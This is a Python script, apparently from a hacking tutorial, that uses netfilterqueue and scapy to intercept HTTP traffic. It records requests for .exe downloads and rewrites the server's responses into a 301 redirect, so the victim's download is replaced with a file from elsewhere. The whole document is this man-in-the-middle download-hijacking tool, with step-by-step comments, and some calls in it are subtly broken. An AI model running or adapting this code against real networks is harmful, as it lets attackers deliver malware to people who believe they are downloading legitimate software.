#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

ack_list = []
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw): # Check if the packet has a HTTP layer, that info is in the raw layer
        if scapy_packet[scapy.TCP].dport == 80: # That means that this is a packet leaving our computer. (it's a request, dport -> destination port)
            if ".exe" in scapy_packet.haslayer(scapy.Raw).load:
                print("[+] Download Request")
                ack_list.append(scapy_packet[scapy.TCP].ack) # That is the field the packets use to be associated with each other

        elif scapy_packet[scapy.TCP].sport == 80: # That means that this is a packet arrived to our computer. (it's a response, sport -> source port)
            if scapy_packet[scapy.TCP].seq in ack_list: # If we catch the ack before means we are interested in that response request
                ack_list.remove(scapy_packet[scapy.TCP].seq) # Removing value as we are not going to use it anymore
                print("[+] Replacing file...")
                # Redirecting the client (Target) to somewhere else (301 moved permanently)...\n\n at the end is to make sure it will be translated properly when it's sent
                scapy_packet.haslayer(scapy.Raw).load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.org/index.asp\n\n"
                # Delete each time we modify a packet to be generated again with the new "hacked" info
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum

                packet.set_payload(str(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(357, process_packet)
queue.run()